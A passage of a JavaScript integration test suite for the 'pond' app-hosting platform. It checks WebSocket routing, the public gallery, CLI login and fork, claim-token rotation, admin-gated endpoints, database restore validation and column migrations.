        "server/index.ts": wsSrc,
        "package.json": '{"name":"ws-cap","private":true,"type":"module"}\n',
      },
    }),
  })
  assert.equal(created.status, 201)
  const { deployId: wsDeployId } = await created.json()

  // Wait until the deploy worker is actually accepting on the API route
  const deployUrl = `http://${wsDeployId}.${publicHost}:${port}`
  // Connect to the proxy by IP and route via the Host header. Using
  // `<deployId>.localhost` in the URL would force a DNS lookup that only the
  // *.localhost TLD shim on Linux/macOS resolves — Windows ENOTFOUNDs it.
  const { WebSocket } = await import("ws")
  const wsClient = new WebSocket(`ws://127.0.0.1:${port}/api/socket/echo`, {
    headers: { host: `${wsDeployId}.${publicHost}:${port}` },
  })
  const opened = new Promise((resolve, reject) => {
    wsClient.once("open", resolve)
    wsClient.once("error", reject)
  })
  await opened
  const msg = new Promise((resolve) => wsClient.once("message", (m) => resolve(m.toString())))
  wsClient.send("hello")
  const out = await msg
  wsClient.close()
  assert.equal(out, "echo:hello")
})

test("public capsule appears in /api/public-deploys and source is exportable", async () => {
  const publicSrc = `import { capsule, query, string, table } from "pond/server"
export default capsule({
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: {},
  public: true,
  title: "My Public Capsule",
  description: "A sample capsule shared via the gallery",
})
`
  const created = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({
      sourceFiles: {
        "server/index.ts": publicSrc,
        "package.json": '{"name":"public-cap","private":true,"type":"module"}\n',
      },
    }),
  })
  assert.equal(created.status, 201)
  const { deployId: publicId } = await created.json()
  assert.ok(publicId)

  // Listed in the public-deploys feed
  const list = await fetch(`${apiUrl}/api/public-deploys`)
  assert.equal(list.status, 200)
  const { deploys: pub } = await list.json()
  const match = pub.find((d) => d.deployId === publicId)
  assert.ok(match, "public deploy should be listed")
  assert.equal(match.title, "My Public Capsule")
  assert.match(match.description, /sample capsule/)

  // Source export works without auth
  const src = await fetch(`${apiUrl}/api/public-deploys/${publicId}/source`)
  assert.equal(src.status, 200)
  const exp = await src.json()
  assert.equal(exp.deployId, publicId)
  assert.ok(exp.files["server/index.ts"], "server/index.ts in export")
  assert.match(exp.files["server/index.ts"], /public:\s*true/)

  // A non-public deploy should 404 from this endpoint
  const privSrc = await fetch(`${apiUrl}/api/public-deploys/${deployId}/source`)
  assert.equal(privSrc.status, 404)
})

test("bare domain GET /dashboard serves the SPA shell", async () => {
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/dashboard",
        headers: { host: `${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data, ct: res.headers["content-type"] }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  assert.match(result.ct ?? "", /text\/html/)
  assert.match(result.body, /pond Dashboard/)
  assert.match(result.body, /window\.__POND_DASHBOARD/)
})

test("bare domain GET /gallery serves the listing page", async () => {
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/gallery",
        headers: { host: `${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data, ct: res.headers["content-type"] }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  assert.match(result.ct ?? "", /text\/html/)
  assert.match(result.body, /Pond gallery/)
  assert.match(result.body, /\/api\/public-deploys/)
})

test("`pond fork <url>` scaffolds a local copy from a public deploy", async () => {
  // Find a public deploy id from the listing
  const list = await fetch(`${apiUrl}/api/public-deploys`)
  const { deploys: pub } = await list.json()
  assert.ok(pub.length >= 1, "need at least one public deploy")
  const target = pub[0]

  const parent = mkdtempSync(path.join(tmpdir(), "pond-fork-"))
  try {
    const { execFile } = await import("node:child_process")
    const { promisify } = await import("node:util")
    const execFileP = promisify(execFile)
    const { stdout } = await execFileP(
      process.execPath,
      [CLI_PATH, "fork", target.deployId, "--api", apiUrl, "--no-git", "--name", "my-fork"],
      {
        cwd: parent,
        env: { ...process.env },
        timeout: 30000,
      },
    )
    assert.match(stdout, /Forked/)
    const dest = path.join(parent, "my-fork")
    assert.ok(existsSync(path.join(dest, "server", "index.ts")), "server/index.ts copied")
    const { readFileSync } = await import("node:fs")
    const server = readFileSync(path.join(dest, "server", "index.ts"), "utf-8")
    assert.match(server, /public:\s*true/)
    assert.ok(existsSync(path.join(dest, ".env.pond.server")), "env file scaffolded")
  } finally {
    rmSync(parent, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
  }
})

test("pond login (no --token) reuses a saved credential and validates against /api/users/me", async () => {
  // 0.3.13 fix. Setup: write a credential to a sandboxed HOME pointing at
  // the running test host, then spawn `pond login` with that HOME. Expect
  // exit 0 + "Already logged in" output (NOT the "Need a token" wall).
  const { execFile } = await import("node:child_process")
  const { promisify } = await import("node:util")
  const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs")
  const { tmpdir } = await import("node:os")
  const execFileP = promisify(execFile)

  const sandboxHome = mkdtempSync(path.join(tmpdir(), "pond-login-sandbox-"))
  mkdirSync(path.join(sandboxHome, ".pond"), { recursive: true })
  writeFileSync(
    path.join(sandboxHome, ".pond", "credentials.json"),
    JSON.stringify({
      credentials: [
        {
          apiUrl,
          username: "admin",
          token: adminToken,
          isAdmin: true,
          savedAt: new Date().toISOString(),
        },
      ],
    }),
    { mode: 0o600 },
  )

  const { stdout, stderr } = await execFileP(process.execPath, [CLI_PATH, "login", "--api", apiUrl], {
    env: { ...process.env, HOME: sandboxHome, USERPROFILE: sandboxHome },
    timeout: 10000,
  })
  const out = stdout + stderr
  assert.match(out, /Already logged in as admin/, `expected "Already logged in" in output, got: ${out}`)
  assert.match(out, /credential from ~\/\.pond\/credentials\.json/)
  assert.doesNotMatch(out, /Need a token/, "must NOT show the old 'Need a token' wall")
})

test("pond login surfaces saved credential offline (transient network failure does NOT block usage)", async () => {
  // The validation call falls back to "trust the saved cred, warn" when the
  // server is unreachable. Without this, users behind a flaky network would
  // be locked out of perfectly valid local credentials.
  const { execFile } = await import("node:child_process")
  const { promisify } = await import("node:util")
  const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs")
  const { tmpdir } = await import("node:os")
  const execFileP = promisify(execFile)

  const sandboxHome = mkdtempSync(path.join(tmpdir(), "pond-login-offline-"))
  // Point at a port that nothing is listening on. Port 1 is reserved (RFC
  // 1700) and refuses connections on macOS/Linux without root.
  const unreachable = "http://127.0.0.1:1"
  mkdirSync(path.join(sandboxHome, ".pond"), { recursive: true })
  writeFileSync(
    path.join(sandboxHome, ".pond", "credentials.json"),
    JSON.stringify({
      credentials: [
        {
          apiUrl: unreachable,
          username: "offline-user",
          token: "fake-token-doesnt-matter",
          isAdmin: false,
          savedAt: new Date().toISOString(),
        },
      ],
    }),
    { mode: 0o600 },
  )

  const { stdout, stderr } = await execFileP(process.execPath, [CLI_PATH, "login", "--api", unreachable], {
    env: { ...process.env, HOME: sandboxHome, USERPROFILE: sandboxHome },
    timeout: 10000,
  })
  const out = stdout + stderr
  assert.match(out, /Saved credential for offline-user/, `expected saved-cred surface, got: ${out}`)
  assert.match(out, /could not validate/, "should explain why no validation happened")
  assert.doesNotMatch(out, /no longer validates/, "must NOT print the auth-failure message on network error")
})

test("pond login rejects a saved credential the server actively returned 401 for", async () => {
  // Distinct from the offline case: a server-side 401 means the token has
  // been rotated or revoked. We must NOT silently use it. Use a known-bad
  // bearer against the running test host.
  const { execFile } = await import("node:child_process")
  const { promisify } = await import("node:util")
  const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs")
  const { tmpdir } = await import("node:os")
  const execFileP = promisify(execFile)

  const sandboxHome = mkdtempSync(path.join(tmpdir(), "pond-login-revoked-"))
  mkdirSync(path.join(sandboxHome, ".pond"), { recursive: true })
  writeFileSync(
    path.join(sandboxHome, ".pond", "credentials.json"),
    JSON.stringify({
      credentials: [
        {
          apiUrl,
          username: "ghost",
          token: "definitely-not-a-real-token-and-the-server-will-401",
          isAdmin: false,
          savedAt: new Date().toISOString(),
        },
      ],
    }),
    { mode: 0o600 },
  )

  await assert.rejects(
    () =>
      execFileP(process.execPath, [CLI_PATH, "login", "--api", apiUrl], {
        env: { ...process.env, HOME: sandboxHome, USERPROFILE: sandboxHome },
        timeout: 10000,
      }),
    (err) => {
      assert.equal(err.code, 1)
      const out = (err.stdout ?? "") + (err.stderr ?? "")
      assert.match(out, /no longer validates/, `expected stale-cred message, got: ${out}`)
      assert.match(out, /server said 401/)
      return true
    },
  )
})

test("claim+signup on a fresh host does NOT mint an admin (privilege-escalation regression)", async () => {
  // Before the fix, the signup branch of /claim passed isFirstUser=!hasAnyUser()
  // as the isAdmin flag, so the first anonymous deployer to claim+signup on a
  // not-yet-bootstrapped host became admin without the host token. /api/users
  // gates first-user bootstrap behind the host token; this path must too.
  const h = await startExtraHost({ extraArgs: ["--anonymous-rate-per-hour", "100"] })
  try {
    const create = await fetch(`${h.apiUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
    })
    assert.equal(create.status, 201)
    const cb = await create.json()
    const claim = await fetch(`${h.apiUrl}/api/deploys/${cb.deployId}/claim`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ claimToken: cb.claimToken, signup: { username: "firstie" } }),
    })
    assert.equal(claim.status, 200)
    const claimed = await claim.json()
    assert.ok(claimed.user?.token, "claim+signup should return a user credential")
    const me = await fetch(`${h.apiUrl}/api/users/me`, {
      headers: { authorization: `Bearer ${claimed.user.token}` },
    })
    assert.equal(me.status, 200)
    const meBody = await me.json()
    assert.equal(meBody.isAdmin, false, "first self-service claimer must NOT be admin")
  } finally {
    await stopExtraHost(h)
  }
})

test("claim rotates the claim token; the pre-claim token no longer authorizes mutations", async () => {
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()
  const oldToken = cb.claimToken

  const claim = await fetch(`${apiUrl}/api/deploys/${cb.deployId}/claim`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ claimToken: oldToken, signup: { username: "rotor" } }),
  })
  assert.equal(claim.status, 200)
  const claimed = await claim.json()
  assert.ok(claimed.claimToken, "claim response should return a claim token")
  assert.notEqual(claimed.claimToken, oldToken, "claim token should be rotated on claim")

  // The leaked pre-claim token must no longer be a write/delete credential.
  const putOld = await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
    method: "PUT",
    headers: { "content-type": "application/json", "x-pond-claim-token": oldToken },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(putOld.status, 401, "leaked pre-claim token must not authorize mutations after claim")

  // The rotated token returned to the legitimate owner still works.
  const putNew = await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
    method: "PUT",
    headers: { "content-type": "application/json", "x-pond-claim-token": claimed.claimToken },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(putNew.status, 200, "rotated claim token should authorize mutations")
})

test("publicInspect exposes read-only inspect but NOT backup/restore/logs without the claim token", async () => {
  const http = await import("node:http")
  const proxyGet = (id, pathname, headers = {}) =>
    new Promise((resolve, reject) => {
      const req = http.request(
        {
          host: "127.0.0.1",
          port,
          method: "GET",
          path: pathname,
          headers: { host: `${id}.${publicHost}:${port}`, ...headers },
        },
        (res) => {
          let data = ""
          res.on("data", (c) => (data += c))
          res.on("end", () => resolve({ status: res.statusCode, body: data }))
        },
      )
      req.on("error", reject)
      req.end()
    })

  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles(), publicInspect: true }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  // Read-only inspection is open under publicInspect (no token needed).
  const tables = await proxyGet(cb.deployId, "/__pond/db/tables")
  assert.equal(tables.status, 200, "publicInspect should allow read-only table listing")

  // Privileged ops are NOT covered by publicInspect.
  const backupNoTok = await proxyGet(cb.deployId, "/__pond/db/backup")
  assert.equal(backupNoTok.status, 403, "backup must require the claim token even when publicInspect")
  const logsNoTok = await proxyGet(cb.deployId, "/__pond/logs")
  assert.equal(logsNoTok.status, 403, "logs must require the claim token even when publicInspect")

  // With the claim token, backup is allowed.
  const backupTok = await proxyGet(cb.deployId, "/__pond/db/backup", { "x-pond-claim-token": cb.claimToken })
  assert.equal(backupTok.status, 200, "claim token should authorize backup")
})

test("GET /metrics is admin-gated and emits Prometheus host metrics", async () => {
  const noAuth = await fetch(`${apiUrl}/metrics`)
  assert.equal(noAuth.status, 401, "/metrics must require auth (it leaks the deploy inventory)")

  const res = await fetch(`${apiUrl}/metrics`, { headers: { authorization: `Bearer ${hostToken}` } })
  assert.equal(res.status, 200)
  assert.match(res.headers.get("content-type") ?? "", /text\/plain/)
  const body = await res.text()
  assert.match(body, /pond_host_capsules_active \d+/)
  assert.match(body, /# TYPE pond_capsule_disk_bytes gauge/)
  assert.match(body, /# TYPE pond_capsule_cpu_seconds_total counter/)
})

test("db restore validates the candidate is a usable SQLite db before staging", async () => {
  const http = await import("node:http")
  const proxyReq = (id, method, pathname, headers = {}, bodyBuf) =>
    new Promise((resolve, reject) => {
      const req = http.request(
        {
          host: "127.0.0.1",
          port,
          method,
          path: pathname,
          headers: {
            host: `${id}.${publicHost}:${port}`,
            ...(bodyBuf ? { "content-length": String(bodyBuf.length) } : {}),
            ...headers,
          },
        },
        (res) => {
          const chunks = []
          res.on("data", (c) => chunks.push(c))
          res.on("end", () => resolve({ status: res.statusCode, buf: Buffer.concat(chunks) }))
        },
      )
      req.on("error", reject)
      if (bodyBuf) req.write(bodyBuf)
      req.end()
    })

  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles() }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()
  const manage = { "x-pond-claim-token": cb.claimToken }

  // A body that passes the 16-byte SQLite magic check but is otherwise garbage
  // is exactly what the old header-only check let through. It must now 400.
  const corrupt = Buffer.concat([Buffer.from("SQLite format 3\0", "latin1"), Buffer.alloc(512, 0x7f)])
  const bad = await proxyReq(cb.deployId, "POST", "/__pond/db/restore", manage, corrupt)
  assert.equal(bad.status, 400, `corrupt restore should 400, got ${bad.status}: ${bad.buf}`)
  assert.match(bad.buf.toString("utf8"), /not a usable SQLite database/)

  // A real snapshot from /__pond/db/backup round-trips through restore (valid
  // candidate is accepted and staged).
  const backup = await proxyReq(cb.deployId, "GET", "/__pond/db/backup", manage)
  assert.equal(backup.status, 200)
  assert.ok(backup.buf.length > 16, "backup should return real db bytes")
  const good = await proxyReq(cb.deployId, "POST", "/__pond/db/restore", manage, backup.buf)
  assert.equal(good.status, 200, `valid restore should 200, got ${good.status}: ${good.buf}`)
  assert.match(good.buf.toString("utf8"), /"ok":true/)
})

test("pond db migrate drops/renames a column on the live database (owner-gated)", async () => {
  const http = await import("node:http")
  const jsonReq = (id, method, pathname, headers = {}, bodyObj) =>
    new Promise((resolve, reject) => {
      const payload = bodyObj === undefined ? undefined : Buffer.from(JSON.stringify(bodyObj))
      const req = http.request(
        {
          host: "127.0.0.1",
          port,
          method,
          path: pathname,
          headers: {
            host: `${id}.${publicHost}:${port}`,
            ...(payload ? { "content-type": "application/json", "content-length": String(payload.length) } : {}),
            ...headers,
          },
        },
        (res) => {
          let data = ""
          res.on("data", (c) => (data += c))
          res.on("end", () => resolve({ status: res.statusCode, body: data }))
        },
      )
      req.on("error", reject)
      if (payload) req.write(payload)
      req.end()
    })

  const migrateSrc = `import { capsule, mutation, query, string, table } from "pond/server"
export default capsule({
  schema: { notes: table({ body: string(), tag: string() }) },
  queries: { notes: query((ctx) => ctx.db.notes.all()) },
  mutations: { add: mutation((ctx, body, tag) => ctx.db.notes.insert({ body, tag })) },
})`
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles: tinySourceFiles(migrateSrc) }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()
  const manage = { "x-pond-claim-token": cb.claimToken }

  // Seed a row.
  const add = await jsonReq(cb.deployId, "POST", "/api/mutation/add", {}, { args: ["hello", "x"] })
  assert.equal(add.status, 200, `seed insert failed: ${add.body}`)

  // Owner gate: no claim token → 403.
  const noTok = await jsonReq(
    cb.deployId,
    "POST",
    "/__pond/db/migrate",
    {},
    { op: "drop", table: "notes", column: "tag" },
  )
  assert.equal(noTok.status, 403, "migrate must require the claim token")

  // Reserved columns are protected.
  const reserved = await jsonReq(cb.deployId, "POST", "/__pond/db/migrate", manage, {
    op: "drop",
    table: "notes",
    column: "id",
  })
  assert.equal(reserved.status, 400)

  // Drop the `tag` column; `body` data must survive.
  const drop = await jsonReq(cb.deployId, "POST", "/__pond/db/migrate", manage, {
    op: "drop",
    table: "notes",
    column: "tag",
  })
  assert.equal(drop.status, 200, `drop failed: ${drop.body}`)
  let rows = JSON.parse((await jsonReq(cb.deployId, "GET", "/__pond/db/dump/notes", manage)).body)
  assert.equal(rows.length, 1)
  assert.equal(rows[0].body, "hello", "row data must survive the drop")
  assert.ok(!("tag" in rows[0]), "dropped column must be gone")

  // Rename `body` → `content`; data preserved under the new name.
  const rename = await jsonReq(cb.deployId, "POST", "/__pond/db/migrate", manage, {
    op: "rename",
    table: "notes",
    column: "body",
    to: "content",
  })
  assert.equal(rename.status, 200, `rename failed: ${rename.body}`)
  rows = JSON.parse((await jsonReq(cb.deployId, "GET", "/__pond/db/dump/notes", manage)).body)
  assert.equal(rows[0].content, "hello", "renamed column carries the data")
  assert.ok(!("body" in rows[0]), "old column name must be gone")
})

// Spawn `pond host` with the given extra args and resolve with {code, output}
// once it exits. Used to assert startup-validation failures (which never reach
// a healthy listening state, so startExtraHost's waitForHealth can't be used).
function runHostExpectingExit(extraArgs) {
  return new Promise(async (resolve, reject) => {
    const xPort = await pickFreePort()
    const xData = mkdtempSync(path.join(tmpdir(), "pond-host-test-exit-"))
    const proc = spawn(
      process.execPath,
      [
        CLI_PATH,
        "host",
        "--port",
        String(xPort),
        "--host",
        "127.0.0.1",
        "--public-host",
        publicHost,
        "--data-dir",
        xData,
        ...extraArgs,
      ],
      { env: { ...process.env, POND_HOST_TOKEN: "x".repeat(32) }, stdio: ["ignore", "pipe", "pipe"] },
    )
    let output = ""
    proc.stdout.on("data", (c) => (output += c))
    proc.stderr.on("data", (c) => (output += c))
    const timer = setTimeout(() => {
      proc.kill("SIGKILL")
      reject(new Error(`host did not exit; expected validation failure. output: ${output}`))
    }, 8000)
    proc.once("exit", (code) => {
      clearTimeout(timer)
      rmSync(xData, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
      resolve({ code, output })
    })
  })
}

test("--capsule-egress with an invalid mode fails fast", async () => {
  const { code, output } = await runHostExpectingExit(["--capsule-egress", "bogus"])
  assert.equal(code, 1)
  assert.match(output, /invalid --capsule-egress/)
})

test("--capsule-egress=proxy is gated until the proxy is wired end-to-end", async () => {
  const { code, output } = await runHostExpectingExit(["--capsule-egress", "proxy"])
  assert.equal(code, 1, "proxy mode must refuse to start rather than silently seal capsules")
  assert.match(output, /not yet wired end-to-end/)
})

test("SIGINT host leaves no orphan deploy-worker processes", async () => {
  await stopHost()
  // After stop, no deploy-worker.js child of the host should remain.
  const { execSync } = await import("node:child_process")
  let psOut = ""
  try {
    psOut = execSync("ps -A -o command", { encoding: "utf-8" })
  } catch {
    psOut = ""
  }
  const lines = psOut.split("\n").filter((l) => l.includes("deploy-worker.js") && l.includes(dataDir))
  assert.equal(lines.length, 0, `orphan workers: ${lines.join("\n")}`)
})
